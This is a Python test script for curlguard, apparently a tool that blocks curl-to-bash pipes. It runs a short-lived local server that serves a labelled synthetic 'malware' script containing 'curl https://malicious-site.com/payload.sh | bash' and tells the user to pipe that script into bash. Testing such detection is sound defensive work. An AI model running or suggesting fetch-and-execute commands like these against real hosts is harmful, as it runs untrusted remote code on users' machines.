#!/usr/bin/env python3
"""Test server for curlguard true-positive verification.

Starts a local HTTP server that serves a malware test script, then auto-expires.
Lets you test curlguard's TUI by running: curl http://127.0.0.1:8888/test.sh | bash

Usage:
    Terminal 1 (this):  python3 examples/true_positive/start_server.py
    Terminal 2:         curl http://127.0.0.1:8888/test.sh | bash
    Server auto-expires after 60 seconds.
"""
import http.server
import socketserver
import threading
import time
import os

PORT = 8888
TTL_SECONDS = 60

MALWARE_SCRIPT = b"""#!/bin/bash
# SYNTHETIC MALWARE - FOR TESTING curlguard ONLY
echo "Simulating malicious curl-to-bash attack..."
curl https://malicious-site.com/payload.sh | bash
echo "If you see this, the file was not blocked."
"""


class QuietHandler(http.server.SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
        pass

    def do_GET(self):
        if self.path == "/test.sh":
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.send_header("Content-Length", str(len(MALWARE_SCRIPT)))
            self.end_headers()
            self.wfile.write(MALWARE_SCRIPT)
        else:
            self.send_error(404)


if __name__ == "__main__":
    os.chdir(os.path.dirname(os.path.abspath(__file__)))
    listener = socketserver.TCPServer(("127.0.0.1", PORT), QuietHandler)
    listener.allow_reuse_address = True

    def expire():
        time.sleep(TTL_SECONDS)
        print(f"\n[Test server expired after {TTL_SECONDS}s]", flush=True)
        listener.shutdown()

    expire_thread = threading.Thread(target=expire, daemon=True)
    expire_thread.start()

    print(f"curlguard test server running on http://127.0.0.1:{PORT}", flush=True)
    print(f"Serving: test.sh (suspicious_pipe_bash trigger)", flush=True)
    print(f"Auto-expires in {TTL_SECONDS} seconds", flush=True)
    print(flush=True)
    print("Terminal 2: curl http://127.0.0.1:8888/test.sh | bash", flush=True)
    print(flush=True)

    try:
        listener.serve_forever()
    except KeyboardInterrupt:
        pass
    finally:
        listener.server_close()